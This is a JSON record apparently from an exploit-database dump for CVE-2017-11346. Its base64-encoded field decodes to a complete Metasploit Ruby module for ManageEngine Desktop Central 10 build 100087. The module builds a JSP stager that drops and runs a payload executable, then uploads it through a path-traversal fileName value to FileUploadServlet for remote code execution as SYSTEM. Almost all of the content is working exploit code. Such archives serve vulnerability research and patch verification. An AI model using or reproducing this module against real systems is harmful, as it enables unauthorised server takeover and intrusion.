{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBNYW5hZ2VFbmdpbmUgRGVza3RvcCBDZW50cmFsIDEwIEJ1aWxkIDEwMDA4NyBSQ0UNCiMgRGF0ZTogMjQtMDctMjAxNw0KIyBTb2Z0d2FyZSBMaW5rOiBodHRwczovL3d3dy5tYW5hZ2VlbmdpbmUuY29tL3Byb2R1Y3RzL2Rlc2t0b3AtY2VudHJhbC8NCiMgRXhwbG9pdCBBdXRob3I6IEthY3BlciBTenVyZWsNCiMgQ29udGFjdDogaHR0cHM6Ly90d2l0dGVyLmNvbS9LYWNwZXJTenVyZWsNCiMgV2Vic2l0ZTogaHR0cHM6Ly9zZWN1cml0eS5zenVyZWsucGwvDQojIENWRTogQ1ZFLTIwMTctMTEzNDYNCiMgQ2F0ZWdvcnk6IHJlbW90ZQ0KIA0KMS4gRGVzY3JpcHRpb24NCiAgIA0KV2hlbiB1cGxvYWRpbmcgYSBmaWxlLCB0aGUgYEZpbGVVcGxvYWRTZXJ2bGV0YCBjbGFzcyBkb2VzIG5vdCBjaGVjayB0aGUgdXNlci1jb250cm9sbGVkIGBmaWxlTmFtZWAgcGFyYW1ldGVyIHVzaW5nIGBoYXNWdWxuZXJhYmlsaXR5SW5GaWxlTmFtZWAgZnVuY3Rpb24uDQoNClRoaXMgYWxsb3dzIGEgcmVtb3RlIGF0dGFja2VyIHRvIGNyZWF0ZSBhIG1hbGljaW91cyBmaWxlIGFuZCBwbGFjZSBpdCB1bmRlciBhIGRpcmVjdG9yeSB0aGF0IGFsbG93cyBzZXJ2ZXItc2lkZSBzY3JpcHRzIHRvIHJ1biwgd2hpY2ggcmVzdWx0cyBpbiByZW1vdGUgY29kZSBleGVjdXRpb24gdW5kZXIgdGhlIGNvbnRleHQgb2YgU1lTVEVNLg0KIA0KaHR0cHM6Ly9zZWN1cml0eS5zenVyZWsucGwvbWFuYWdlZW5naW5lLWRlc2t0b3AtY2VudHJhbC0xMC1idWlsZC0xMDAwODctcmNlLmh0bWwNCiAgIA0KMi4gUHJvb2Ygb2YgQ29uY2VwdA0KIA0KIyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ25va29naXJpJw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cENsaWVudA0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RVhFDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpGaWxlRHJvcHBlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gIk1hbmFnZUVuZ2luZSBEZXNrdG9wIENlbnRyYWwgMTAgRmlsZVVwbG9hZFNlcnZsZXQgZmlsZU5hbWUgUkNFIFZ1bG5lcmFiaWxpdHkiLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB2dWxuZXJhYmlsaXR5IGZvdW5kIGluIE1hbmFnZUVuZ2luZSBEZXNrdG9wIENlbnRyYWwgMTAuIFdoZW4NCiAgICAgICAgdXBsb2FkaW5nIGEgZmlsZSwgdGhlIEZpbGVVcGxvYWRTZXJ2bGV0IGNsYXNzIGRvZXMgbm90IGNoZWNrIHRoZSB1c2VyLWNvbnRyb2xsZWQNCiAgICAgICAgZmlsZU5hbWUgcGFyYW1ldGVyLiBUaGlzIGFsbG93cyBhIHJlbW90ZSBhdHRhY2tlciB0byBjcmVhdGUgYSBtYWxpY2lvdXMgZmlsZSBhbmQgcGxhY2UNCiAgICAgICAgaXQgdW5kZXIgYSBkaXJlY3RvcnkgdGhhdCBhbGxvd3Mgc2VydmVyLXNpZGUgc2NyaXB0cyB0byBydW4sDQogICAgICAgIHdoaWNoIHJlc3VsdHMgaW4gcmVtb3RlIGNvZGUgZXhlY3V0aW9uIHVuZGVyIHRoZSBjb250ZXh0IG9mIFNZU1RFTS4NCg0KICAgICAgICBUaGlzIGV4cGxvaXQgd2FzIHN1Y2Nlc3NmdWxseSB0ZXN0ZWQgb24gdmVyc2lvbiAxMCwgYnVpbGQgMTAwMDg3Lg0KDQogICAgICAgIEV4cGxvaXQgY29kZSBiYXNlZCBvbiBodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8zODk4Mi8NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9PiBbICdLYWNwZXIgU3p1cmVrJyBdLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vc2VjdXJpdHkuc3p1cmVrLnBsL21hbmFnZWVuZ2luZS1kZXNrdG9wLWNlbnRyYWwtMTAtYnVpbGQtMTAwMDg3LXJjZS5odG1sJyBdDQogICAgICAgIF0sDQogICAgICAnUGxhdGZvcm0nICAgICAgID0+ICd3aW4nLA0KICAgICAgJ1RhcmdldHMnICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnTWFuYWdlRW5naW5lIERlc2t0b3AgQ2VudHJhbCAxMCBvbiBXaW5kb3dzJywge30gXQ0KICAgICAgICBdLA0KICAgICAgJ1BheWxvYWQnICAgICAgICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ0JhZENoYXJzJyA9PiAiXHgwMCINCiAgICAgICAgfSwNCiAgICAgICdQcml2aWxlZ2VkJyAgICAgPT4gZmFsc2UsDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICJKdWx5IDI0IDIwMTciLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCg0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ1RBUkdFVFVSSScsIFt0cnVlLCAnVGhlIGJhc2UgcGF0aCBmb3IgTWFuYWdlRW5naW5lIERlc2t0b3AgQ2VudHJhbCcsICcvJ10pLA0KICAgICAgICBPcHQ6OlJQT1JUKDgwMjApDQogICAgICBdLCBzZWxmLmNsYXNzKQ0KICBlbmQNCg0KICBkZWYganNwX2Ryb3BfYmluKGJpbl9kYXRhLCBvdXRwdXRfZmlsZSkNCiAgICBqc3ByYXcgPSAgJVF8PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+XG58DQogICAganNwcmF3IDw8ICVRfDwlXG58DQogICAganNwcmF3IDw8ICVRfFN0cmluZyBkYXRhID0gIiN7UmV4OjpUZXh0LnRvX2hleChiaW5fZGF0YSwgIiIpfSI7XG58DQoNCiAgICBqc3ByYXcgPDwgJVF8RmlsZU91dHB1dFN0cmVhbSBvdXRwdXRzdHJlYW0gPSBuZXcgRmlsZU91dHB1dFN0cmVhbSgiI3tvdXRwdXRfZmlsZX0iKTtcbnwNCg0KICAgIGpzcHJhdyA8PCAlUXxpbnQgbnVtYnl0ZXMgPSBkYXRhLmxlbmd0aCgpO1xufA0KDQogICAganNwcmF3IDw8ICVRfGJ5dGVbXSBieXRlcyA9IG5ldyBieXRlW251bWJ5dGVzLzJdO1xufA0KICAgIGpzcHJhdyA8PCAlUXxmb3IgKGludCBjb3VudGVyID0gMDsgY291bnRlciA8IG51bWJ5dGVzOyBjb3VudGVyICs9IDIpXG58DQogICAganNwcmF3IDw8ICVRfHtcbnwNCiAgICBqc3ByYXcgPDwgJVF8ICBjaGFyIGNoYXIxID0gKGNoYXIpIGRhdGEuY2hhckF0KGNvdW50ZXIpO1xufA0KICAgIGpzcHJhdyA8PCAlUXwgIGNoYXIgY2hhcjIgPSAoY2hhcikgZGF0YS5jaGFyQXQoY291bnRlciArIDEpO1xufA0KICAgIGpzcHJhdyA8PCAlUXwgIGludCBjb21iID0gQ2hhcmFjdGVyLmRpZ2l0KGNoYXIxLCAxNikgJiAweGZmO1xufA0KICAgIGpzcHJhdyA8PCAlUXwgIGNvbWIgPDw9IDQ7XG58DQogICAganNwcmF3IDw8ICVRfCAgY29tYiArPSBDaGFyYWN0ZXIuZGlnaXQoY2hhcjIsIDE2KSAmIDB4ZmY7XG58DQogICAganNwcmF3IDw8ICVRfCAgYnl0ZXNbY291bnRlci8yXSA9IChieXRlKWNvbWI7XG58DQogICAganNwcmF3IDw8ICVRfH1cbnwNCg0KICAgIGpzcHJhdyA8PCAlUXxvdXRwdXRzdHJlYW0ud3JpdGUoYnl0ZXMpO1xufA0KICAgIGpzcHJhdyA8PCAlUXxvdXRwdXRzdHJlYW0uY2xvc2UoKTtcbnwNCiAgICBqc3ByYXcgPDwgJVF8JT5cbnwNCg0KICAgIGpzcHJhdw0KICBlbmQNCg0KICBkZWYganNwX2V4ZWN1dGVfY29tbWFuZChjb21tYW5kKQ0KICAgIGpzcHJhdyA9ICAlUXw8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uKiIgJT5cbnwNCiAgICBqc3ByYXcgPDwgJVF8PCVcbnwNCiAgICBqc3ByYXcgPDwgJVF8dHJ5IHtcbnwNCiAgICBqc3ByYXcgPDwgJVF8ICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJjaG1vZCAreCAje2NvbW1hbmR9Iik7XG58DQogICAganNwcmF3IDw8ICVRfH0gY2F0Y2ggKElPRXhjZXB0aW9uIGlvZSkgeyB9XG58DQogICAganNwcmF3IDw8ICVRfFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIiN7Y29tbWFuZH0iKTtcbnwNCiAgICBqc3ByYXcgPDwgJVF8JT5cbnwNCg0KICAgIGpzcHJhdw0KICBlbmQNCg0KICBkZWYgZ2V0X2pzcF9zdGFnZXINCiAgICBleGUgPSBnZW5lcmF0ZV9wYXlsb2FkX2V4ZShjb2RlOiBwYXlsb2FkLmVuY29kZWQpDQogICAganNwX2ZuYW1lID0gIiN7UmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYSg1KX0uanNwIg0KDQogICAgcmVnaXN0ZXJfZmlsZXNfZm9yX2NsZWFudXAoIi4uL3dlYmFwcHMvRGVza3RvcENlbnRyYWwvanNwZi8je2pzcF9mbmFtZX0iKQ0KDQogICAgew0KICAgICAganNwX3BheWxvYWQ6IGpzcF9kcm9wX2JpbihleGUsIGpzcF9mbmFtZSkgKyBqc3BfZXhlY3V0ZV9jb21tYW5kKGpzcF9mbmFtZSksDQogICAgICBqc3BfbmFtZTogICAganNwX2ZuYW1lDQogICAgfQ0KICBlbmQNCg0KICBkZWYgZ2V0X2J1aWxkX251bWJlcihyZXMpDQogICAgaW5wdXRzID0gcmVzLmdldF9oaWRkZW5faW5wdXRzDQogICAgaW5wdXRzLmZpcnN0WydidWlsZE51bSddDQogIGVuZA0KDQogIGRlZiBnZXRfaHRtbF90aXRsZShyZXMpDQogICAgaHRtbCA9IHJlcy5ib2R5DQogICAgbiA9IDo6Tm9rb2dpcmk6OkhUTUwoaHRtbCkNCiAgICB4ID0gbi54cGF0aCgnLy90aXRsZScpLnRleHQNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgdXJpID0gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICcvY29uZmlndXJhdGlvbnMuZG8nKQ0KDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICd1cmknICAgID0+IHVyaQ0KICAgIH0pDQoNCiAgICB1bmxlc3MgcmVzDQogICAgICBwcmludF9lcnJvcigiQ29ubmVjdGlvbiB0aW1lZCBvdXQiKQ0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6VW5rbm93bg0KICAgIGVuZA0KDQogICAgYnVpbGRfbnVtYmVyID0gZ2V0X2J1aWxkX251bWJlcihyZXMpDQogICAgaWYgYnVpbGRfbnVtYmVyLnRvX3MuZW1wdHk/DQogICAgICBwcmludF9lcnJvcigiQ2Fubm90IGZpbmQgYnVpbGQgbnVtYmVyIikNCiAgICBlbHNlDQogICAgICBwcmludF9zdGF0dXMoIkZvdW5kIGJ1aWxkIG51bWJlcjogI3tidWlsZF9udW1iZXJ9IikNCiAgICBlbmQNCiAgICANCiAgICBodG1sX3RpdGxlICAgPSBnZXRfaHRtbF90aXRsZShyZXMpDQoNCiAgICBpZiBodG1sX3RpdGxlLnRvX3MuZW1wdHk/DQogICAgICBwcmludF9lcnJvcigiQ2Fubm90IGZpbmQgdGl0bGUiKQ0KICAgIGVsc2UNCiAgICAgIHByaW50X3N0YXR1cygiRm91bmQgdGl0bGU6ICN7aHRtbF90aXRsZX0iKQ0KICAgIGVuZA0KICAgDQogICAgaWYgYnVpbGRfbnVtYmVyLnRvX2kgPD0gMTAwMDg3DQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpBcHBlYXJzDQogICAgZWxzaWYgL01hbmFnZUVuZ2luZSBEZXNrdG9wIENlbnRyYWwgMTAvID09PSBodG1sX3RpdGxlDQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpEZXRlY3RlZA0KICAgIGVuZA0KDQoNCiAgICBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCiAgZW5kDQoNCiAgZGVmIHVwbG9hZF9qc3Aoc3RhZ2VyX2luZm8pDQogICAgdXJpID0gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICdmaWxldXBsb2FkJykNCg0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KICAgICAgJ21ldGhvZCcgICAgPT4gJ1BPU1QnLA0KICAgICAgJ3VyaScgICAgID0+IHVyaSwNCiAgICAgICdjdHlwZScgICAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgJ2VuY29kZV9wYXJhbXMnID0+IGZhbHNlLA0KICAgICAgJ2RhdGEnICAgICAgPT4gc3RhZ2VyX2luZm9bOmpzcF9wYXlsb2FkXSwNCiAgICAgICd2YXJzX2dldCcgICAgPT4gew0KICAgICAgICAnYWN0aW9uJyAgICA9PiAnSGVscERlc2tfdmlkZW8nLA0KICAgICAgICAnY29tcHV0ZXJOYW1lJyAgPT4gUmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYShyYW5kKDEwKSs1KSwNCiAgICAgICAgJ3Jlc291cmNlSWQnICA9PiAxLA0KICAgICAgICAnY3VzdG9tZXJJZCcgID0+IDEsDQogICAgICAgICdmaWxlTmFtZScgICAgPT4gIlxcLi5cXC4uXFwuLlxcLi5cXGpzcGZcXCN7c3RhZ2VyX2luZm9bOmpzcF9uYW1lXX0iDQogICAgICB9DQogICAgfSkNCg0KICAgIGlmIHJlcy5uaWw/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgIkNvbm5lY3Rpb24gdGltZWQgb3V0IHdoaWxlIHVwbG9hZGluZyB0byAje3VyaX0iKQ0KICAgIGVsc2lmIHJlcyAmJiByZXMuY29kZSAhPSAyMDANCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAiVGhlIHNlcnZlciByZXR1cm5lZCAje3Jlcy5jb2RlfSwgYnV0IDIwMCB3YXMgZXhwZWN0ZWQuIikNCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIGV4ZWNfanNwKHN0YWdlcl9pbmZvKQ0KICAgIHVyaSA9IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAiL2pzcGYvI3tzdGFnZXJfaW5mb1s6anNwX25hbWVdfSIpDQoNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCiAgICAgICdtZXRob2QnID0+ICdHRVQnLA0KICAgICAgJ3VyaScgICAgPT4gdXJpDQogICAgfSkNCg0KICAgIGlmIHJlcy5uaWw/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgIkNvbm5lY3Rpb24gdGltZWQgb3V0IHdoaWxlIGV4ZWN1dGluZyAje3VyaX0iKQ0KICAgIGVsc2lmIHJlcyAmJiByZXMuY29kZSAhPSAyMDANCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAiRmFpbGVkIHRvIGV4ZWN1dGUgI3t1cml9LiBTZXJ2ZXIgcmV0dXJuZWQgI3tyZXMuY29kZX0iKQ0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIHByaW50X3N0YXR1cygiQ3JlYXRpbmcgSlNQIHN0YWdlciIpDQogICAgc3RhZ2VyX2luZm8gPSBnZXRfanNwX3N0YWdlcg0KDQogICAgcHJpbnRfc3RhdHVzKCJVcGxvYWRpbmcgSlNQIHN0YWdlciAje3N0YWdlcl9pbmZvWzpqc3BfbmFtZV19Li4uIikNCiAgICB1cGxvYWRfanNwKHN0YWdlcl9pbmZvKQ0KDQogICAgcHJpbnRfc3RhdHVzKCJFeGVjdXRpbmcgc3RhZ2VyLi4uIikNCiAgICBleGVjX2pzcChzdGFnZXJfaW5mbykNCiAgZW5kDQoNCmVuZA0KICAgDQozLiBTb2x1dGlvbjoNCiAgIA0KaHR0cHM6Ly93d3cubWFuYWdlZW5naW5lLmNvbS9wcm9kdWN0cy9kZXNrdG9wLWNlbnRyYWwvcmVtb3RlLWNvZGUtZXhlY3V0aW9uLmh0bWw=", 
    "filename": "platforms/java/webapps/42358.rb", 
    "id": "42358", 
    "cves": [
        "CVE-2017-11346"
    ]
}